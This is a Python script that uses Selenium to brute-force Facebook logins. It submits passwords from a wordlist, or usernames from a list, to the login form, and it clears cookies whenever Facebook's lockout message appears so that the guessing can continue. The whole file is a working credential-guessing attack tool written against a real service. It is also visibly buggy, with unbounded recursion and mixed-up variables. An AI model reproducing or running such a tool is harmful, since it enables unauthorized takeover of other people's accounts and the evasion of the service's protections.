from selenium import webdriver
from selenium.webdriver.common.keys import Keys
import sys
import os
import re
from time import sleep
import arghandle

class Args():
    user = ""
    password = ""
    userlist = ""
    passlist = ""
    speed = 0
    userField = ""
    passwordField = ""
    url = ""
    tries = 0
    target = ""
    show = False
    setup = arghandle

if Args.show == True:
    os.environ['MOZ_HEADLESS'] = '1'

readfile=open(Args.passlist,"r")
driver = webdriver.Firefox()
driver.get(Args.url)

def brute_facebook(x):
    if Args.passlist != "" and Args.password == "":
        dictionary = readfile.readlines()
        for word in dictionary:
            elem = driver.find_element_by_id("email")
            driver.find_element_by_id("email").clear()
            elem.send_keys(Args.user)
            elem = driver.find_element_by_id("pass")
            elem.send_keys(word)
            elem.send_keys(Keys.RETURN)
            sleep(2)
            incorrect = ("entered is incorrect" in driver.page_source or "try again later." in driver.page_source)
            detected = ("try again later." in driver.page_source)
            if incorrect:
                tryagin = 'Try #'+str(x)+' for Account '+ Args.user + ' password '+ word
                if detected:
                    tryagin = 'Try #'+str(x)+' for usr '+ Args.user + ' pwd '+ word + "clearing cookies"
                    driver.delete_all_cookies()
                x+=1
                print "\r" + tryagin ,
                sys.stdout.write("\033[F")
                sys.stdout.write("\033[K") #clear line
                brute_facebook(x)
            else:
                print('\rProgramm exited with password '+ word +' Because error not detected.')
                return
    if Args.userlist != "":
        for word in Args.userlist:
            elem = driver.find_element_by_id("email")
            driver.find_element_by_id("email").clear()
            elem.send_keys(word)
            elem = driver.find_element_by_id("pass")
            elem.send_keys(Args.password)
            elem.send_keys(Keys.RETURN)
            sleep(2)
            incorrect = ("entered is incorrect" in driver.page_source or "try again later." in driver.page_source)
            detected = ("try again later." in driver.page_source)
            if incorrect:
                tryagin = 'Try #'+str(x)+' for Account '+ Args.user + ' password '+ word
                if detected:
                    tryagin = 'Try #'+str(x)+' for usr '+ Args.user + ' pwd '+ word + "clearing cookies"
                    driver.delete_all_cookies()
                x+=1
                print "\r"+tryagin ,
                sys.stdout.write("\033[F")
                sys.stdout.write("\033[K") #clear line
                brute_facebook(x)
            else:
                print('\rProgramm exited with password '+ word +' Because error not detected.')
                return


if __name__== "__main__":
    if arghandle.verify():
        print("Begin Brute")
        brute_facebook(x=0)
    driver.close()